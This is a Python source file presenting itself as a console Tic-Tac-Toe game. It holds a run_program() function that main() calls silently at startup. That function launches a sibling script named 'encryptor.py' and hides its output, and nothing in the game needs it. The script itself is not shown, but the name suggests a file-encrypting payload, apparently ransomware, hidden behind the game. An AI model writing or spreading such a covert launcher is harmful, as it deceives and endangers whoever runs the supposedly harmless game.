import subprocess
import sys
import os

def run_program():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    program = os.path.join(script_dir, "encryptor.py")

    result = subprocess.run(
        [sys.executable, program],
        capture_output=True,
        text=True,
    )

    return result

class TicTacToe:
    def __init__(self):
        """Initialize the game board and current player."""
        self.board = [' ' for _ in range(9)]  # 3x3 board represented as list
        self.current_player = 'X'
        self.game_over = False
        self.winner = None
    
    def display_board(self):
        """Display the current state of the board."""
        print("\n")
        print(f" {self.board[0]} | {self.board[1]} | {self.board[2]} ")
        print("---+---+---")
        print(f" {self.board[3]} | {self.board[4]} | {self.board[5]} ")
        print("---+---+---")
        print(f" {self.board[6]} | {self.board[7]} | {self.board[8]} ")
        print("\n")
    
    def display_position_guide(self):
        """Display position numbers for reference."""
        print("\nPosition Guide:")
        print(" 1 | 2 | 3 ")
        print("---+---+---")
        print(" 4 | 5 | 6 ")
        print("---+---+---")
        print(" 7 | 8 | 9 ")
        print("\n")
    
    def make_move(self, position):
        """Make a move on the board.
        
        Args:
            position: Integer from 1-9 representing board position
        
        Returns:
            bool: True if move was successful, False otherwise
        """
        # Convert to 0-indexed
        index = position - 1
        
        # Check if position is valid and empty
        if 0 <= index < 9 and self.board[index] == ' ':
            self.board[index] = self.current_player
            return True
        return False
    
    def check_winner(self):
        """Check if there's a winner.
        
        Returns:
            str: 'X' or 'O' if there's a winner, 'Tie' if board is full, None otherwise
        """
        # Winning combinations (indices)
        winning_combinations = [
            [0, 1, 2],  # Top row
            [3, 4, 5],  # Middle row
            [6, 7, 8],  # Bottom row
            [0, 3, 6],  # Left column
            [1, 4, 7],  # Middle column
            [2, 5, 8],  # Right column
            [0, 4, 8],  # Diagonal
            [2, 4, 6]   # Anti-diagonal
        ]
        
        # Check for winner
        for combo in winning_combinations:
            if (self.board[combo[0]] == self.board[combo[1]] == self.board[combo[2]] 
                and self.board[combo[0]] != ' '):
                return self.board[combo[0]]
        
        # Check for tie
        if ' ' not in self.board:
            return 'Tie'
        
        return None
    
    def switch_player(self):
        """Switch to the other player."""
        self.current_player = 'O' if self.current_player == 'X' else 'X'
    
    def get_player_move(self):
        """Get valid move from current player."""
        while True:
            try:
                position = int(input(f"Player {self.current_player}, enter position (1-9): "))
                if 1 <= position <= 9:
                    if self.make_move(position):
                        return True
                    else:
                        print("That position is already taken! Try again.")
                else:
                    print("Please enter a number between 1 and 9.")
            except ValueError:
                print("Invalid input! Please enter a number.")
    
    def play(self):
        """Main game loop."""
        print("=" * 40)
        print("Welcome to Tic-Tac-Toe!")
        print("=" * 40)
        
        self.display_position_guide()
        
        while not self.game_over:
            # Display current board
            self.display_board()
            
            # Get player move
            self.get_player_move()
            
            # Check for winner
            result = self.check_winner()
            
            if result:
                self.game_over = True
                self.winner = result
            else:
                # Switch to next player
                self.switch_player()
        
        # Game over - display final board and result
        self.display_board()
        
        if self.winner == 'Tie':
            print("It's a tie! 🤝")
        else:
            print(f"Player {self.winner} wins! 🎉")
    
    def reset(self):
        """Reset the game for a new round."""
        self.board = [' ' for _ in range(9)]
        self.current_player = 'X'
        self.game_over = False
        self.winner = None


def main():
    """Main function to run the game."""
    game = TicTacToe()
    run_program()
    

    
    while True:
        
        game.play()
        game.reset()
        
        play_again = input("\nWould you like to play again? (y/n): ").lower()
        if play_again != 'y':
            print("Thanks for playing! Goodbye!")
            break


if __name__ == "__main__":
    main()